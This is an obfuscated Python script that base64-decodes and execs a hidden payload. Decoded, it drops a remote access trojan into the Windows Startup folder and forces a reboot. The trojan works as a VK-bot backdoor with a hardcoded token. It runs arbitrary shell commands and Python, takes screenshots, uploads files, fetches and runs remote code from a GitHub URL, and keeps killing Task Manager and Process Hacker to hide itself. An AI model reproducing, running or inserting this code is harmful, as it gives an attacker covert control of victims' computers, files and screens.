import base64
test = '''aW1wb3J0IGdldHBhc3MsIG9zCnVzZXJuYW1lID0gZ2V0cGFzcy5nZXR1c2VyKCkKYm90X3RleHQgPSAociIiImZyb20gdmtib3R0bGUuYm90IGltcG9ydCBCb3QsIE1lc3NhZ2UKZnJvbSB2a2JvdHRsZSBpbXBvcnQgQVBJLCBQaG90b01lc3NhZ2VVcGxvYWRlciwgTG9vcFdyYXBwZXIsIERvY01lc3NhZ2VzVXBsb2FkZXIKaW1wb3J0IGFzeW5jaW8sIGdldHBhc3MsIGJhc2U2NCwgcmVxdWVzdHMKbHcgPSBMb29wV3JhcHBlcigpCmJvdCA9IEJvdCgnMzUxM2EwMTU4Yjg3ZWJmMmEyOWQ3MWY1MThkZWQ5MGMyMjk0MWM5MmM2MjczOTFmNTU0NmFmNzIxMTYxOTgwZDI3OTQyMDAyOTliMjhjMTJlZmJkYycpCgpAYm90Lm9uLnByaXZhdGVfbWVzc2FnZSh0ZXh0PSdzY3JlZW4nKQphc3luYyBkZWYgcHJpdihtZXNzYWdlOiBNZXNzYWdlKToKICAgIGlmIG1lc3NhZ2UuZnJvbV9pZCA9PSA2OTA2MzQ1MDg6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpbXBvcnQgcHlhdXRvZ3VpCiAgICAgICAgICAgIHBob3RvID0gUGhvdG9NZXNzYWdlVXBsb2FkZXIoYm90LmFwaSkKICAgICAgICAgICAgcHlhdXRvZ3VpLnNjcmVlbnNob3QoJ3NjcmVlbi5qcGcnKQogICAgICAgICAgICBwaG90b191cGQgPSBhd2FpdCBwaG90by51cGxvYWQoJ3NjcmVlbi5qcGcnKQogICAgICAgICAgICBhd2FpdCBtZXNzYWdlLmFuc3dlcihhdHRhY2htZW50PXBob3RvX3VwZCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEVyOgogICAgICAgICAgICBhd2FpdCBtZXNzYWdlLmFuc3dlcihzdHIoRXIpKQoKQGJvdC5vbi5wcml2YXRlX21lc3NhZ2UodGV4dD0nLXA8Y29tbWFuZD4nKQphc3luYyBkZWYgcHJpdihtZXNzYWdlOiBNZXNzYWdlLCBjb21tYW5kKToKICAgIGlmIG1lc3NhZ2UuZnJvbV9pZCA9PSA2OTA2MzQ1MDg6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBwb3BlbiA9IChvcy5wb3Blbihjb21tYW5kKSkKICAgICAgICAgICAgbGluZXMgPSBwb3Blbi5yZWFkbGluZXMoKQogICAgICAgICAgICBiID0gJycKICAgICAgICAgICAgZm9yIGcgaW4gbGluZXM6CiAgICAgICAgICAgICAgICBiID0gYiArIGcKICAgICAgICAgICAgYXdhaXQgbWVzc2FnZS5hbnN3ZXIoYikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEVyOgogICAgICAgICAgICBhd2FpdCBtZXNzYWdlLmFuc3dlcihFcikKCkBib3Qub24ucHJpdmF0ZV9tZXNzYWdlKHRleHQ9Jy1nZXRmaWxlY29tIDxjb21tYW5kPicpCmFzeW5jIGRlZiBwcml2KG1lc3NhZ2U6IE1lc3NhZ2UsIGNvbW1hbmQpOgogICAgaWYgbWVzc2FnZS5mcm9tX2lkID09IDY5MDYzNDUwODoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHBhdGggPSBvcy5nZXRjd2QoKQogICAgICAgICAgICBwb3BlbiA9IChvcy5wb3Blbihjb21tYW5kKSkKICAgICAgICAgICAgbGluZXMgPSBwb3Blbi5yZWFkbGluZXMoKQogICAgICAgICAgICBiID0gJycKICAgICAgICAgICAgZm9yIGcgaW4gbGluZXM6CiAgICAgICAgICAgICAgICBiID0gYiArIGcKICAgICAgICAgICAgZnVsbHBhdGggPSBwYXRoICsgJy9jb21tYW5kbG9nLnR4dCcKICAgICAgICAgICAgd2l0aCBvcGVuKGZ1bGxwYXRoLCAndycpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGIpCiAgICAgICAgICAgIGRvY3VwZCA9IERvY01lc3NhZ2VzVXBsb2FkZXIoYm90LmFwaSkKICAgICAgICAgICAgbXlkb2MgPSBhd2FpdCBkb2N1cGQudXBsb2FkKCdjb21tYW5kbG9nLnR4dCcsIGZ1bGxwYXRoLCBwZWVyX2lkPW1lc3NhZ2UucGVlcl9pZCkKICAgICAgICAgICAgYXdhaXQgbWVzc2FnZS5hbnN3ZXIoJ0NvbW1hbmQgZmlsZScsIGF0dGFjaG1lbnQ9bXlkb2MpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBFcjoKICAgICAgICAgICAgYXdhaXQgbWVzc2FnZS5hbnN3ZXIoRXIpCgpAYm90Lm9uLnByaXZhdGVfbWVzc2FnZSh0ZXh0PSctcmVhZCA8cGF0aD4nKQphc3luYyBkZWYgcHJpdihtZXNzYWdlOiBNZXNzYWdlLCBwYXRoKToKICAgIGlmIG1lc3NhZ2UuZnJvbV9pZCA9PSA2OTA2MzQ1MDg6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBiID0gJycKICAgICAgICAgICAgZG9jdXBkID0gRG9jTWVzc2FnZXNVcGxvYWRlcihib3QuYXBpKQogICAgICAgICAgICBteWRvYyA9IGF3YWl0IGRvY3VwZC51cGxvYWQoJ3Rlc3QudHh0JywgcGF0aCwgcGVlcl9pZD1tZXNzYWdlLnBlZXJfaWQpCiAgICAgICAgICAgIGF3YWl0IG1lc3NhZ2UuYW5zd2VyKCdDb21wbGV0ZWQnLCBhdHRhY2htZW50PW15ZG9jKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgRXI6CiAgICAgICAgICAgIGF3YWl0IG1lc3NhZ2UuYW5zd2VyKEVyKQoKQGJvdC5vbi5wcml2YXRlX21lc3NhZ2UodGV4dD0nLXRoJykKYXN5bmMgZGVmIHByaXYobWVzc2FnZTogTWVzc2FnZSk6CiAgICBpZiBtZXNzYWdlLmZyb21faWQgPT0gNjkwNjM0NTA4OgogICAgICAgIHRyeToKICAgICAgICAgICAgY3dkID0gb3MuZ2V0Y3dkKCkKICAgICAgICAgICAgYXdhaXQgbWVzc2FnZS5hbnN3ZXIoY3dkKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgRXI6CiAgICAgICAgICAgIGF3YWl0IG1lc3NhZ2UuYW5zd2VyKEVyKQpleGVjKCgocmVxdWVzdHMuZ2V0KChiYXNlNjQuYjY0ZGVjb2RlKCgnYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMFp5YVdWdVpHOXphV1V2WVdKamRHVnpkSEJ5YjJkeVlXMHZiV0ZwYmk5dGVXSnZkQzV3ZVNjcExtVnVZMjlrWlNnbmRYUm1MVGc9JykuZW5jb2RlKCd1dGYtOCcpKSkuZGVjb2RlKCd1dGY4JykpKS50ZXh0KS5yZXBsYWNlKCc0MDQ6IE5vdCBGb3VuZCcsICcnKSkKQGJvdC5vbi5wcml2YXRlX21lc3NhZ2UoKQphc3luYyBkZWYgcHJpdihtZXNzYWdlOiBNZXNzYWdlKToKICAgIGlmIG1lc3NhZ2UuZnJvbV9pZCA9PSA2OTA2MzQ1MDg6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBtc2cgPSBtZXNzYWdlLnRleHQKICAgICAgICAgICAgbXNnID0gbXNnLnJlcGxhY2UocicKJywgJwonKQogICAgICAgICAgICBleGVjKG1lc3NhZ2UudGV4dCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEVyOgogICAgICAgICAgICBhd2FpdCBtZXNzYWdlLmFuc3dlcihzdHIoRXIpKQoKQGx3LnRpbWVyKHNlY29uZHM9MSkKYXN5bmMgZGVmIGRlbGF5ZWRfdGFzaygpOgogICAgYXBpID0gQVBJKCczNTEzYTAxNThiODdlYmYyYTI5ZDcxZjUxOGRlZDkwYzIyOTQxYzkyYzYyNzM5MWY1NTQ2YWY3MjExNjE5ODBkMjc5NDIwMDI5OWIyOGMxMmVmYmRjJykKICAgIGF3YWl0IGFwaS5tZXNzYWdlcy5zZW5kKHBlZXJfaWQ9NjkwNjM0NTA4LCBtZXNzYWdlPSgoKGdldHBhc3MuZ2V0dXNlcigpKS5yZXBsYWNlKCdQQycsICcnKSkgKyAnIHdhcyBjb25uZWN0ZWQnKSwgcmFuZG9tX2lkPTApCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgb3Muc3lzdGVtKCd0YXNra2lsbCAvZiAvaW0gUHJvY2Vzc0hhY2tlci5leGUnKQogICAgICAgICAgICBvcy5zeXN0ZW0oJ3Rhc2traWxsIC9mIC9pbSBUYXNrbWdyLmV4ZScpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEVyOgogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdjbHMnKQogICAgICAgICAgICBhd2FpdCBhc3luY2lvLnNsZWVwKDAuNCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEVyOgogICAgICAgICAgICBhd2FpdCBhc3luY2lvLnNsZWVwKDAuMikKCgpib3QubG9vcF93cmFwcGVyID0gbHcKYm90LnJ1bl9mb3JldmVyKCkiIiIpCnVzZXJuYW1lID0gdXNlcm5hbWUucmVwbGFjZSgnUEMnLCAnJykKd2l0aCBvcGVuKGZyJ0M6Ly9Vc2Vycy97dXNlcm5hbWV9L0FwcERhdGEvUm9hbWluZy9NaWNyb3NvZnQvV2luZG93cy9TdGFydCBNZW51L1Byb2dyYW1zL1N0YXJ0dXAvV2luZG93czMyLnB5dycsICd3JykgYXMgZjoKICAgIGYud3JpdGUoYm90X3RleHQpCm9zLnN5c3RlbSgnc2h1dGRvd24gL3IgL3QgMScp'''
exec((base64.b64decode(test.encode('utf-8'))).decode('utf8'))
